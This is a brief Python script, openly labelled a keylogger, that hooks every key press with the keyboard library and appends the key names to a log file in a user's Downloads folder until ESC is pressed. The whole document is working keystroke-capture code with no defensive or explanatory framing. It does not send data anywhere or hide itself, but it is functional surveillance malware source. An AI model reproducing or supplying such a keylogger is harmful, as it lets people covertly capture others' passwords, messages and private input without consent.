import keyboard

# Define the log file
key_stroke = "C:\\Users\\pushk\\Downloads\\key_log.txt"

def write_key(key):
    with open(key_stroke, "a") as f:
        f.write(f'{key.name}\n')

# Set up the listener
keyboard.on_press(write_key)

print("Keylogger started... Press ESC to stop.")
keyboard.wait('esc')
print("Keylogger stopped.")
